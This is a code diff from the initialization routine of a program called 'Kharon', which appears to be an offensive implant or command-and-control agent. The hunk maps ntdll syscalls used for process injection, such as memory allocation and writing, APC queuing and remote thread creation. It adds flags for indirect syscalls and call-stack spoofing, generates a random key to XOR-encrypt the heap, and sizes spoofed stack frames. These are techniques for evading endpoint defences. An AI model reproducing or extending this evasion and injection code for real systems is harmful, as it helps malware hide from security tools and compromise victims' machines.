@@ -140,25 +140,34 @@ auto DECLFN Kharon::Init(
     }
 
     /* ========= [ syscalls setup ] ========= */
-    this->Sys->Ext[syAlloc].Address    = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
-    this->Sys->Ext[syWrite].Address    = U_PTR( this->Ntdll.NtWriteVirtualMemory );
-    this->Sys->Ext[syOpenProc].Address = U_PTR( this->Ntdll.NtOpenProcess );
-    this->Sys->Ext[syOpenThrd].Address = U_PTR( this->Ntdll.NtOpenThread );
-    this->Sys->Ext[syQueueApc].Address = U_PTR( this->Ntdll.NtQueueApcThread );
-    this->Sys->Ext[syProtect].Address  = U_PTR( this->Ntdll.NtProtectVirtualMemory );
-    this->Sys->Ext[syCrThread].Address = U_PTR( this->Ntdll.NtCreateThreadEx );
-    this->Sys->Ext[syCrSectn].Address  = U_PTR( this->Ntdll.NtCreateSection );
-    this->Sys->Ext[syMapView].Address  = U_PTR( this->Ntdll.NtMapViewOfSection );
+    this->Sys->Ext[Sys::Alloc].Address    = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
+    this->Sys->Ext[Sys::Write].Address    = U_PTR( this->Ntdll.NtWriteVirtualMemory );
+    this->Sys->Ext[Sys::OpenProc].Address = U_PTR( this->Ntdll.NtOpenProcess );
+    this->Sys->Ext[Sys::OpenThrd].Address = U_PTR( this->Ntdll.NtOpenThread );
+    this->Sys->Ext[Sys::QueueApc].Address = U_PTR( this->Ntdll.NtQueueApcThread );
+    this->Sys->Ext[Sys::Protect].Address  = U_PTR( this->Ntdll.NtProtectVirtualMemory );
+    this->Sys->Ext[Sys::CrThread].Address = U_PTR( this->Ntdll.NtCreateThreadEx );
+    this->Sys->Ext[Sys::CrSectn].Address  = U_PTR( this->Ntdll.NtCreateSection );
+    this->Sys->Ext[Sys::MapView].Address  = U_PTR( this->Ntdll.NtMapViewOfSection );
 
-    for ( INT i = 0; i < syLast -1; i++ ) {
+    for ( INT i = 0; i < Sys::Last -1; i++ ) {
         this->Sys->Fetch( i );
     }
 
-    /* ========= [ key generation to xor heap ] ========= */
+    /* ========= [ set syscall flags ] ========= */
+    this->KH_SYSCALL_FLAGS = 0;
 
+    if ( this->Spf->Enabled ) this->KH_SYSCALL_FLAGS |= SYSCALL_SPOOF;
+    if ( this->Sys->Enabled ) this->KH_SYSCALL_FLAGS |= SYSCALL_INDIRECT;
+
+    /* ========= [ key generation to xor heap ] ========= */
     for ( INT i = 0; i < sizeof( this->Crp->XorKey ); i++ ) {
         this->Crp->XorKey[i] = (BYTE)Rnd32();
     }
+
+    /* ========= [ calculate stack for spoof ] ========= */
+    this->Spf->Setup.First.Size  = this->Spf->StackSizeWrapper( this->Spf->Setup.First.Ptr );
+    this->Spf->Setup.Second.Size = this->Spf->StackSizeWrapper( this->Spf->Setup.Second.Ptr );
 
     /* ========= [ informations collection ] ========= */
     CHAR   cProcessorName[MAX_PATH] = { 0 };
